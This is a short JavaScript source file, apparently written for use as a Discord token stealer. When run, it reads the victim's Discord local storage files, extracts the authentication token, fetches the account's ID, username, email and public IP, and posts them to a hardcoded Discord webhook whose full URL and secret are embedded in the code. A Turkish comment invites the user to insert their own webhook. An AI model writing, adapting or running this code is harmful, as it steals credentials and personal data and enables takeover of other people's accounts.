const fetch = require('node-fetch');
const os = require('os');
const fs = require('fs');
const path = require('path');

const webhookUrl = 'https://discord.com/api/webhooks/1255660925785083934/ZlrUFWX1tGMo4FoWzIm_siIC9I7gCsw4UU31mL8ok2_jridANsvwK58JzUb9lffExHVE'; // Webhook URL'nizi buraya koyun

async function sendToWebhook(data) {
    await fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: data }),
    });
}

async function getDiscordToken() {
    const localAppData = process.env.LOCALAPPDATA;
    const discordPath = path.join(localAppData, 'Discord');
    const leveldbPath = path.join(discordPath, 'Local Storage', 'leveldb');

    let token = null;
    fs.readdirSync(leveldbPath).forEach(file => {
        if (file.endsWith('.ldb') || file.endsWith('.log')) {
            const filePath = path.join(leveldbPath, file);
            const content = fs.readFileSync(filePath, 'utf8');
            const regex = /"token":"(.*?)"/;
            const match = regex.exec(content);
            if (match) {
                token = match[1];
            }
        }
    });

    return token;
}

async function getUserInfo(token) {
    const response = await fetch('https://discord.com/api/v9/users/@me', {
        headers: {
            'Authorization': `${token}`,
        },
    });
    const userData = await response.json();
    const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(json => json.ip);
    const data = `
**User Information**
**Token:** ${token}
**ID:** ${userData.id}
**Username:** ${userData.username}#${userData.discriminator}
**Email:** ${userData.email}
**IP:** ${ip}
`;

    await sendToWebhook(data);
}

(async () => {
    const token = await getDiscordToken();
    if (token) {
        await getUserInfo(token);
    } else {
        console.log('Token not found');
    }
})();
